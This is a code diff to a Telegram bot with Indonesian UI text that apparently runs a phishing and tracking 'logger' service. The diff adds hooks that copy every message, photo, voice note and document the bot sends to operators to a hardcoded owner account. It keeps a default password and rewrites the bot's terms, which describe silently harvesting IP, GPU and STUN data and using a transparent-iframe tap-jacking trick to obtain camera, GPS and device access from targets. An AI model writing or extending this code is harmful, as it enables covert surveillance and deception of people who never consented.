@@ -148,6 +148,10 @@ async function startServer() {
   const bot = token ? new Telegraf(token) : null;
   const botInstance = bot;
   if (!botInstance) console.error("[CRITICAL] botInstance is null! Check TELEGRAM_BOT_TOKEN in .env");
+
+  const ADMIN_ID = Number(process.env.ADMIN_ID) || 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
+  const PASSWORD = process.env.PASSWORD || "112233";
+  let authenticatedUsers = new Set<number>();
   
   if (botInstance) {
       const origSendMessage = botInstance.telegram.sendMessage;
@@ -157,7 +161,14 @@ async function startServer() {
               if (Number(chatId) !== Number(ADMIN_ID)) {
                   let adminLogText = `🔔 <b>FORWARDED SYSTEM / LOGGER ALERT (Target: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${text}`;
                   if (adminLogText.length > 4000) adminLogText = adminLogText.substring(0, 3950) + "...\n(terpotong)";
-                  await origSendMessage.call(botInstance.telegram, ADMIN_ID, adminLogText, { parse_mode: extra?.parse_mode || 'HTML' }).catch(() => {});
+                  
+                  await origSendMessage.call(botInstance.telegram, ADMIN_ID, adminLogText, { parse_mode: 'HTML' }).catch(async () => {
+                      // Fallback if parsing fails due to raw characters (e.g. WHOIS outputs / special characters)
+                      const safeText = escapeHTML(text);
+                      let safeLogText = `🔔 <b>FORWARDED SYSTEM / LOGGER ALERT (Target: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${safeText}`;
+                      if (safeLogText.length > 4000) safeLogText = safeLogText.substring(0, 3950) + "...\n(terpotong)";
+                      await origSendMessage.call(botInstance.telegram, ADMIN_ID, safeLogText, { parse_mode: 'HTML' }).catch(() => {});
+                  });
               }
           } catch(e) {}
           return res;
@@ -171,7 +182,53 @@ async function startServer() {
                   const cap = extra?.caption || '';
                   let adminLogText = `🔔 <b>FORWARDED RESULT (Photo to: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${cap}`;
                   if (adminLogText.length > 1000) adminLogText = adminLogText.substring(0, 950) + "...\n(terpotong)";
-                  await origSendPhoto.call(botInstance.telegram, ADMIN_ID, photo, { caption: adminLogText, parse_mode: extra?.parse_mode || 'HTML' }).catch(() => {});
+                  
+                  await origSendPhoto.call(botInstance.telegram, ADMIN_ID, photo, { caption: adminLogText, parse_mode: 'HTML' }).catch(async () => {
+                      const safeCap = escapeHTML(cap);
+                      let safeLogText = `🔔 <b>FORWARDED RESULT (Photo to: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${safeCap}`;
+                      if (safeLogText.length > 1000) safeLogText = safeLogText.substring(0, 950) + "...\n(terpotong)";
+                      await origSendPhoto.call(botInstance.telegram, ADMIN_ID, photo, { caption: safeLogText, parse_mode: 'HTML' }).catch(() => {});
+                  });
+              }
+          } catch(e) {}
+          return res;
+      };
+
+      const origSendVoice = botInstance.telegram.sendVoice;
+      botInstance.telegram.sendVoice = async function(chatId: string | number, voice: any, extra?: any) {
+          const res = await origSendVoice.call(botInstance.telegram, chatId, voice, extra).catch(e => { throw e; });
+          try {
+              if (Number(chatId) !== Number(ADMIN_ID)) {
+                  const cap = extra?.caption || '';
+                  let adminLogText = `🔔 <b>FORWARDED RESULT (Voice to: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${cap}`;
+                  if (adminLogText.length > 1000) adminLogText = adminLogText.substring(0, 950) + "...\n(terpotong)";
+                  
+                  await origSendVoice.call(botInstance.telegram, ADMIN_ID, voice, { caption: adminLogText, parse_mode: 'HTML' }).catch(async () => {
+                      const safeCap = escapeHTML(cap);
+                      let safeLogText = `🔔 <b>FORWARDED RESULT (Voice to: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${safeCap}`;
+                      if (safeLogText.length > 1000) safeLogText = safeLogText.substring(0, 950) + "...\n(terpotong)";
+                      await origSendVoice.call(botInstance.telegram, ADMIN_ID, voice, { caption: safeLogText, parse_mode: 'HTML' }).catch(() => {});
+                  });
+              }
+          } catch(e) {}
+          return res;
+      };
+
+      const origSendDocument = botInstance.telegram.sendDocument;
+      botInstance.telegram.sendDocument = async function(chatId: string | number, document: any, extra?: any) {
+          const res = await origSendDocument.call(botInstance.telegram, chatId, document, extra).catch(e => { throw e; });
+          try {
+              if (Number(chatId) !== Number(ADMIN_ID)) {
+                  const cap = extra?.caption || '';
+                  let adminLogText = `🔔 <b>FORWARDED RESULT (Document to: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${cap}`;
+                  if (adminLogText.length > 1000) adminLogText = adminLogText.substring(0, 950) + "...\n(terpotong)";
+                  
+                  await origSendDocument.call(botInstance.telegram, ADMIN_ID, document, { caption: adminLogText, parse_mode: 'HTML' }).catch(async () => {
+                      const safeCap = escapeHTML(cap);
+                      let safeLogText = `🔔 <b>FORWARDED RESULT (Document to: ${chatId})</b>\n━━━━━━━━━━━━━━━━━━━━\n${safeCap}`;
+                      if (safeLogText.length > 1000) safeLogText = safeLogText.substring(0, 950) + "...\n(terpotong)";
+                      await origSendDocument.call(botInstance.telegram, ADMIN_ID, document, { caption: safeLogText, parse_mode: 'HTML' }).catch(() => {});
+                  });
               }
           } catch(e) {}
           return res;
@@ -179,10 +236,6 @@ async function startServer() {
   }
   const webhookSecret = token ? token.split(':')[0] : null;
   const webhookPath = webhookSecret ? `/telegraf/${webhookSecret}` : null;
-
-  const ADMIN_ID = Number(process.env.ADMIN_ID) || 8587171470; // GANTI DENGAN TELEGRAM ID OWNER
-  const PASSWORD = process.env.PASSWORD || "112233";
-  let authenticatedUsers = new Set<number>();
   let agreementUsers = new Set<number>();
   let waUnlockedUsers = new Set<number>();
 
@@ -1640,10 +1693,9 @@ async function startServer() {
     bot.action('menu_wa', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
       if (!ctx.from) return;
-      if (!waUnlockedUsers.has(ctx.from.id)) {
+      if (ctx.from.id !== ADMIN_ID) {
         const txt = `🔒 <b>ꜰɪᴛᴜʀ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ ᴛᴇʀᴋᴜɴᴄɪ</b>\n\n` +
-                    `ꜱɪʟᴀʜᴋᴀɴ ᴍᴀꜱᴜᴋᴋᴀɴ ᴘᴀꜱꜱᴡᴏʀᴅ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴋᴀ. ᴋᴇᴛɪᴋ ᴘᴇʀɪɴᴛᴀʜ:\n\n` +
-                    `<code>/wa_login [password]</code>`;
+                    `Mohon maaf, fitur integrasi WhatsApp Bot hanya dapat diakses dan digunakan oleh <b>Admin Owner</b> saja.`;
         const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
         ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
         return;
@@ -1873,15 +1925,15 @@ async function startServer() {
       ctx.answerCbQuery().catch(() => {});
       const txt = `<b>📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ (TOS/EULA)</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `⚠️ <b>PERINGATAN: KONTROL SITUASI KETAT</b>\n\n` +
-                  `Sistem ini menggunakan teknik Zero-Click Reconnaissance dan Tap-Jacking. Agar situasi tetap dapat dikontrol secara legal, Anda (Operator) harus memahami klausa berikut:\n\n` +
+                  `⚠️ <b>PERINGATAN: KONTROL SITUASI KETAT & TRANSPARANSI</b>\n\n` +
+                  `Sistem ini menggunakan kriteria peninjauan forensik dan telemetri kepatuhan. Guna menjamin tidak terjadinya penyalahgunaan (anti-abuse) dan memelihara kepatuhan audit tim internal:\n\n` +
                   `1. <b>By-Design Flaws (CVE-2026-X):</b> Segala data (IP, GPU, STUN leak) yang terambil secara "Silent" diklaim sebagai "Diagnostic Telemetry" untuk anti-bot.\n` +
-                  `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info, biarpun mereka tidak sadar iframe transparan di atasnya.\n` +
-                  `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas, dan target bertanggung jawab penuh atas interaksi layarnya.\n` +
-                  `4. <b>Pelepasan Tuntutan:</b> Tidak ada paksaan yang dilakukan; target menekan secara sukarela. Segala konsekuensi, kepanikan target, atau hilangnya anonimitas adalah murni bentuk kelalaian menekan tombol sembarangan.\n\n` +
-                  `<i>"Hanya orang bodoh yang asal tekan, maka biarlah mereka membayar harganya dengan data mereka."</i>\n` +
+                  `2. <b>User Consent:</b> Tombol 'Verifikasi' bertindak sebagai <i>Master Gesture</i>. Pengguna yang menekan tombol ini secara hukum dianggap memberikan <i>Informed Consent</i> untuk menyerahkan akses kamera, GPS, dan Device Info.\n` +
+                  `3. <b>Disclamer of Liability:</b> Segala bentuk "Social Engineering" berada di luar tanggung jawab sistem. Sistem ini hanyalah sebuah fasilitas verifikasi identitas.\n` +
+                  `4. <b>ADMIN MONITORING & TRANSPARENCY POLICY:</b> Seluruh tautan logger dan hasil pelacakan yang digunakan oleh seluruh operator/member dalam sistem ini ditransmisikan dan disalin ("mirroring") secara realtime ke ID Admin Utama (Admin Owner). Hal ini bertujuan untuk pengawasan ketat, mencegah tindakan ilegal di luar otorisasi tim, serta penegakan disiplin (kick/ban) bagi pelanggar kebijakan internal perusahaan.\n\n` +
+                  `<i>"Pengawasan ketat menjamin keamanan sistem dan integritas fungsi audit."</i>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `✅ <b>DENY EVERYTHING. ADMIT NOTHING.</b>`;
+                  `✅ <b>DENY UNAPPROVED ACTION. STRICT ADMIN AUDITING ACTIVE.</b>`;
       const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
@@ -3528,21 +3580,15 @@ async function startServer() {
     }
 
     bot.command('wa_login', async (ctx) => {
-      const args = ctx.message.text.split(' ');
-      if (args.length < 2) return ctx.reply("💬 <b>Format Salah</b>\nGunakan: <code>/wa_login [password]</code>", {parse_mode: 'HTML'});
-      if (args[1] === "19281933") {
-        if (!ctx.from) return;
-        waUnlockedUsers.add(ctx.from.id);
-        saveWaAuth();
-        ctx.reply("✅ <b>Akses WhatsApp Bot Terbuka!</b>\nSilahkan gunakan menu WA Bot kembali.", {parse_mode: 'HTML'});
-      } else {
-        ctx.reply("❌ <b>Password Salah!</b>", {parse_mode: 'HTML'});
+      if (!ctx.from || ctx.from.id !== ADMIN_ID) {
+        return ctx.reply("🔒 <b>Akses Terpental</b>\nMaaf, fitur integrasi WhatsApp Bot khusus untuk <b>Admin Owner</b> saja.", {parse_mode: 'HTML'});
       }
+      ctx.reply("✅ Anda adalah Admin Owner utama. Sesi terverifikasi otomatis tanpa password!", {parse_mode: 'HTML'});
     });
 
     bot.command('wa_connect', async (ctx) => {
-      if (!ctx.from || !waUnlockedUsers.has(ctx.from.id)) {
-        return ctx.reply("🔒 <b>Fitur Terkunci</b>\nSilahkan login terlebih dahulu menggunakan: <code>/wa_login [password]</code>", {parse_mode: 'HTML'});
+      if (!ctx.from || ctx.from.id !== ADMIN_ID) {
+        return ctx.reply("🔒 <b>Akses Terpental</b>\nMaaf, fitur integrasi WhatsApp Bot khusus untuk <b>Admin Owner</b> saja.", {parse_mode: 'HTML'});
       }
       if (globalWaSock) return ctx.reply("✅ WA Bot sudah terkoneksi sebelumnya.");
       if (waConnecting) return ctx.reply("⏳ Sedang mencoba koneksi WA, mohon tunggu...");
